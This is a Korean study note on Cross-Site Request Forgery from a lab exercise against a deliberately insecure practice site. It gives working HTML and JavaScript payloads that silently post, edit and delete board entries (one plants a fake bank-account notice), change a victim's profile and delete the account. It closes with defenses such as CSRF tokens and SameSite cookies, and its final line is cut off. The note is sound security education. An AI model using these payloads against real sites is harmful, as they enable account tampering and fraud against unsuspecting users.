---
CMDS: Security
관련 문서:
  - "[[109 Security]]"
tags:
  - "#CSRF"
  - "#XSRF"
---

Cross-Site Request Forgery : 사용자가 의도하지 않은 일을 공격자에 의해 강제로 수행되게 만드는 방식

1. 사용자 정보 수정
2. 패스워드 변경
3. 탈퇴

  

공격 원리

![[90. Settings/92. Attachments/Untitled 21.png|Untitled 21.png]]

![[90. Settings/92. Attachments/Untitled 1 3.png|Untitled 1 3.png]]

  

XSS vs CSRF

XSS : 공격 대상이 사용자

CSRF : 공격 대상이 서버 ( 공격 요청이 아님 )

  

실습

게시글이 어떤 로직으로 진행되는지 파악해야함

  

게시글을 클릭하면 해당 사용자 명의로 게시글 작성

```JavaScript
<body onload="document.forms[0].submit()">
	<form action="http://192.168.55.206/insecure_website/action.php" method="POST" 
	enctype="multipart/form-data">
		<input type="hidden" name="title" value="해커가 무단으로 작성">
		<input type="hidden" name="password" value="test">
		<input type="hidden" name="content" value="해커다">
		<input type="hidden" name="mode" value="write">
		<input type="submit">
	</form>
</body>
```

게시글 클릭시 해당 내용으로 게시글 수정

```JavaScript
<body onload="document.forms[0].submit()">
	<form action="http://192.168.55.206/insecure_website/action.php" method="POST" 
	enctype="multipart/form-data">
		<input type="hidden" name="title" value="계좌번호 정보입니다">
		<input type="hidden" name="content" 
		value="*은행 : 우리 *예금주 : 해커 
		*계좌번호 : 4444-4444-44444444 모든 상품에 대한 입금은 해당 계좌로 진행하시면 됩니다">
		<input type="hidden" name="password" value="a">
		<input type="hidden" name="idx" value="21">
		<input type="hidden" name="mode" value="modify">
		<input type="submit">
	</form>
</body>
```

게시글 클릭 시 게시글 삭제

```JavaScript
<body onload="document.forms[0].submit()">
	<form action="http://192.168.55.206/insecure_website/action.php" method="POST"
	 enctype="multipart/form-data">
		<input type="hidden" name="password" value="a">
		<input type="hidden" name="idx" value="23">
		<input type="hidden" name="mode" value="delete">
		<input type="submit">
	</form>
</body>
```

  

2) 회원정보 무단 수정, 탈퇴

게시글 클릭 시 개인정보 수정

```JavaScript
<body onload="document.forms[0].submit()">
	<form action="http://192.168.55.206/insecure_website/index.php?page=mypage" 
	method="POST">
		<input type="hidden" name="gubun" value="action">
		<input type="hidden" name="name" value="희생자">
		<input type="hidden" name="email" value="victim">
		<input type="hidden" name="company" value="희생">
		<input type="submit">
	</form>
</body>
```

게시글 클릭 시 탈퇴

```JavaScript
<img src="http://192.168.55.206/insecure_website/withdrawal.php">
```

  

3) Ajax를 활용한 Stealth CSRF 공격

→ 게시글에 들어가도 회원 정보가 변경되었는지 알아차리기 힘듬

(일반 게시글에 들어간것처럼 느껴지지만 실제로는 회원정보가 변경)

```JavaScript
<script>
var xhp=new XMLHttpRequest();
//전송방식, URL, 동기화 여부(true=비동기화)
xhp.open("POST","http://192.168.55.206/insecure_website/index.php?page=mypage",true);
xhp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
xhp.send("gubun=action&name=희생자&password=test&email=victim&company=희생");
</script>
```

  

대응방안

1. Referer 값 검증
    
    회원 정보가 정상적인 사이트에서 이루어졌는지 검증
    
2. CSRF TOKEN 사용
    
    세션에 Token을 넣고, Form 태그 내에도 Token 값을 넣어 두개의 값을 비교해서 정상적인 요청인지 확인
    
    ![[90. Settings/92. Attachments/Untitled 2 4.png|Untitled 2 4.png]]
    
3. 인증 로직 / CAPCHA 사용
    
    수정, 삭제 시 패스워드 요구
    
4. SameSite Cookie
    
    다른 사이트로 갈 때 쿠키 값을 전달하지 않